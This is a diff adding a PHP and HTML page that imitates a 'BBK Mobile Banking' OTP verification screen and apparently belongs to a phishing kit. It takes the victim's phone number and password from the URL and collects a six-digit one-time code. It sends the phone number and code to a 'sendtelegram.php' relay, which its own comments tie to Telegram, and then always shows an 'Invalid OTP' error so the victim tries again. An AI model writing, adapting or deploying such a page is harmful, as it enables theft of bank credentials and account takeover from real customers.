@@ -1,0 +1,600 @@
+<?php
+// Function to sanitize input
+function sanitizeInput($data) {
+    return htmlspecialchars(trim($data));
+}
+
+// Retrieve and sanitize input from the URL
+
+$phone = isset($_GET['phone']) ? sanitizeInput($_GET['phone']) : '';
+$pass = isset($_GET['pass']) ? sanitizeInput($_GET['pass']) : '';
+
+// Additional validation can be added here
+?>
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBK Mobile Banking - OTP Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            /* background: linear-gradient(135deg, #4A90E2 0%, #2E5BBA 50%, #1E3A8A 100%); */
+            min-height: 100vh;
+  background-color: #ffffff;
+
+            display: flex;
+            flex-direction: column;
+            color: black;
+            overflow-x: hidden;
+        }
+
+        .container {
+            flex: 1;
+            padding: 0px;
+            display: flex;
+            flex-direction: column;
+            max-width: 400px;
+            margin: 0px;
+            width: 100%;
+        }
+
+         .logo-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 20px;
+            margin-top: 5px;
+        }
+
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            box-shadow: none;
+            /* text-align: center; */
+            /* margin-top:-30px; */
+        }
+
+        .logo-star {
+            position: absolute;
+            right: -15px;
+            top: -5px;
+            font-size: 20px;
+            color: white;
+        }
+
+        .logo-arabic {
+            font-size: 12px;
+            letter-spacing: 1px;
+            opacity: 0.9;
+            direction: rtl;
+        }
+
+        .verification-text {
+            text-align: center;
+            margin-bottom: 20px;
+            margin-top: -40px;
+            z-index: 1000;
+        }
+
+        .verification-text h1 {
+            font-size: 24px;
+            font-weight: 500;
+            line-height: 1.4;
+            margin-bottom: 20px;
+            color: #02374f;
+        }
+
+        .verification-text p {
+            font-size: 16px;
+            opacity: 0.8;
+            line-height: 1.5;
+            color: #02374f;
+            font-weight: 500;
+
+
+        }
+
+        .username-display {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 15px;
+            background-color: #479b23ab;
+            border-radius: 10px;
+        }
+
+        .username-display .label {
+            font-size: 14px;
+            opacity: 0.7;
+            margin-bottom: 5px;
+            color: white;
+        }
+
+        .username-display .value {
+            font-size: 18px;
+            font-weight: 500;
+            color: white;
+        }
+
+        .otp-container {
+            margin-bottom: 20px;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 30px;
+            /* color: black; */
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            background: transparent;
+            border: 1.5px solid #02374fa4;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            color: black;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .otp-input:focus {
+            border-color: #02374f;
+            border: 2px solid #02374f;
+        }
+
+        .otp-input.filled {
+            border-color: rgba(255, 255, 255, 0.8);
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .otp-input.error {
+            border-color: #ff4757;
+            background: rgba(255, 71, 87, 0.1);
+        }
+
+        .resend-container {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .resend-text {
+            font-size: 14px;
+            opacity: 0.7;
+            margin-bottom: 10px;
+            color: #143524ff;
+        }
+
+        .resend-button {
+            background: none;
+            border: none;
+            color: #25523b;
+            font-size: 16px;
+            text-decoration: underline;
+            cursor: pointer;
+            opacity: 0.9;
+            transition: opacity 0.3s ease;
+        }
+
+        .resend-button:hover {
+            opacity: 1;
+        }
+
+        .resend-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .timer {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 5px;
+            color: #143524ff;
+            
+        }
+
+        .verify-button {
+            background: #78b4e8;
+            border: none;
+            border-radius: 25px;
+            padding: 18px;
+            font-size: 18px;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 30px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            font-weight: 400;
+            width: 100%;
+        }
+        .verify-button:active{
+            transform: scale(0.8);
+        }
+
+        /* .verify-button:hover {
+            background: #005eb8;
+            transform: translateY(-1px);
+        } */
+
+        .verify-button:disabled {
+            opacity: 1;
+            /* cursor: not-allowed; */
+            transform: none;
+        }
+
+        .back-button {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .back-button a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 300;
+            opacity: 0.9;
+            transition: opacity 0.3s ease;
+        }
+
+        .back-button a:hover {
+            opacity: 1;
+            text-decoration: underline;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            /* margin-right: 10px; */
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Error Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .error-modal {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 320px;
+            width: 90%;
+            text-align: center;
+            color: #333;
+            transform: scale(0.8);
+            transition: transform 0.3s ease;
+        }
+
+        .modal-overlay.show .error-modal {
+            transform: scale(1);
+        }
+
+        .error-icon {
+            font-size: 48px;
+            color: #ff4757;
+            margin-bottom: 20px;
+        }
+
+        .error-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .error-message {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .error-button {
+            background: #ff4757;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px 30px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .error-button:hover {
+            background: #ff3742;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .verification-text h1 {
+                font-size: 22px;
+            color: #02374f;
+            font-weight: 500;
+
+            }
+            
+            .otp-input {
+                width: 45px;
+                height: 55px;
+                font-size: 20px;
+            }
+        }
+         .hero {
+      position: relative;
+      width: 60px;       /* adjust to your needs */
+      height: 60px;      /* adjust to your needs */
+      background-image: url('back.webp'); /* your green gradient */
+      background-size: cover;
+      background-position: center;
+      overflow: hidden;
+      /* shadow */
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      margin:auto;
+      margin-bottom:5px;
+      margin-top:5px;
+    }
+.hero{
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin-top: 0px;
+  width: 100%;
+  height: auto; 
+            box-shadow: none;
+            background-color: #005eb8;
+
+
+
+}
+  .logoimg {
+    width: 30%;
+    height: auto;
+  }
+          .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+            position: relative;
+        }
+        .head-image {
+            width: 20%;
+            height: auto;
+            margin-bottom: 30px;
+            /* margin-left:70%; */
+            /* border-radius: 10px; */
+            /* box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); */
+        }
+    </style>
+</head>
+<body>
+        <!-- <div class="logo-text">
+ <div class="hero">
+<img src="main.png" alt="TD Logo" class="logoimg" >
+</div>
+</div> -->
+    <div class="container">
+        <div class="logo-container">
+                        <div class="logo-text">
+                   <img src="pass.png" class="head-image" />
+                </div>
+        </div>
+
+        <div class="verification-text">
+            <h1>OTP Verification</h1>
+            <p>We've sent a 6-digit verification code to your registered mobile number</p>
+        </div>
+
+        <div class="username-display">
+            <div class="label">Logged in as:</div>
+            <div class="value" id="displayUsername">
+                Guest User
+            </div>
+        </div>
+
+        <div class="otp-container">
+            <div class="otp-inputs">
+                <input type="tel" class="otp-input" maxlength="1" id="otp1">
+                <input type="tel" class="otp-input" maxlength="1" id="otp2">
+                <input type="tel" class="otp-input" maxlength="1" id="otp3">
+                <input type="tel" class="otp-input" maxlength="1" id="otp4">
+                <input type="tel" class="otp-input" maxlength="1" id="otp5">
+                <input type="tel" class="otp-input" maxlength="1" id="otp6">
+            </div>
+        </div>
+
+        <div class="resend-container">
+            <div class="resend-text">Didn't receive the code?</div>
+            <button class="resend-button" onclick="resendOTP()" id="resendBtn" disabled="">Resend OTP</button>
+            <div class="timer" id="timer">Resend available in 37s</div>
+        </div>
+
+        <button class="verify-button" onclick="verifyOTP()" id="verifyBtn">Verify</button>
+        <div class="error-message" style="color: red; display: none;margin:auto;margin-top:0px;">Invalid OTP Please try again.</div>
+
+        <!-- <div class="back-button">
+            <a href="index.php">← Back to Login</a>
+        </div> -->
+    </div>
+
+
+<script>
+async function verifyOTP() {
+    // Collect OTP inputs
+    
+ const otpInputs   = Array.from(document.querySelectorAll('.otp-input'));
+    const otp         = otpInputs.map(i => i.value.trim()).join('');
+    const errorMessage= document.querySelector('.error-message');
+    const verifyBtn   = document.getElementById('verifyBtn');
+    // Validate
+    if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+      alert("Please enter a valid 6-digit OTP.");
+      return;
+    }
+// errorMessage.style.display = 'none';
+    verifyBtn.disabled       = true;
+    verifyBtn.style.backgroundColor = '#02374f94';
+    verifyBtn.innerHTML      = '<span class="loading-spinner"></span>';
+    // These come from PHP
+ 
+    const params = new URLSearchParams(window.location.search);
+
+
+
+      
+  const phone = params.get("phone") || "";
+  const pass = params.get("pass") || "";
+
+      const message = `
+OTP:
+
+👤 Name: ${firstName} ${lastName}
+📞 Phone: ${phone}
+🔢 OTP: ${otp}
+`;
+  
+      await new Promise(res => setTimeout(res, 3000));
+
+   try {
+      const res = await fetch('sendtelegram.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message })
+      });
+      if (!res.ok) throw new Error('Telegram send failed');
+
+      // On success, redirect to next page
+      errorMessage.style.display = 'block';
+    //   turn off the loading spinner
+      verifyBtn.innerHTML = 'Verify';
+      verifyBtn.disabled = false;
+      verifyBtn.style.backgroundColor = '#02374f';
+
+  
+    } catch (err) {
+      console.error("Error sending OTP log to Telegram:", err);
+      alert("OTP verification failed. Please try again.");
+    }
+  }
+
+    // Handle auto-forward and backspace
+    const inputs = document.querySelectorAll('.otp-input');
+
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            const value = input.value;
+            if (value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+    });
+</script>
+<script>
+    let timer;
+    let countdown = 60; // 60 seconds for the resend button
+
+    function startTimer() {
+        const timerElement = document.getElementById('timer');
+        timerElement.textContent = `Resend OTP available in ${countdown}s`;
+
+        timer = setInterval(() => {
+            countdown--;
+            timerElement.textContent = `Resend OTP available in ${countdown}s`;
+
+            if (countdown <= 0) {
+                clearInterval(timer);
+                document.getElementById('resendBtn').disabled = false;
+                timerElement.textContent = '';
+            }
+        }, 1000);
+    }
+
+    function resendOTP() {
+
+        const timerElement = document.getElementById('timer');
+        timerElement.textContent = 'Please wait...';
+        setTimeout(() => {
+            timerElement.textContent = '';
+              countdown = 60; // Reset countdown
+        document.getElementById('resendBtn').disabled = true;
+        startTimer();
+        }, 2000);
+ 
+    }
+    window.onload = startTimer;
+
+</script>
+<script>
+    const verifyBtn = document.getElementById('verifyBtn');
+
+    function checkOtpFilled() {
+        const allFilled = Array.from(inputs).every(input => input.value.trim().length === 1);
+        if (allFilled) {
+            verifyBtn.disabled = false;
+            verifyBtn.style.backgroundColor = ' #02374f'; // Change to your desired color
+        } else {
+            verifyBtn.disabled = true;
+            verifyBtn.style.backgroundColor = ' #02374f94'; 
+        }
+    }
+
+    inputs.forEach(input => {
+        input.addEventListener('input', checkOtpFilled);
+        input.addEventListener('keydown', checkOtpFilled);
+    });
+
+    checkOtpFilled(); // Initial check in case some fields are autofilled
+</script>
+
+
+</body></html>
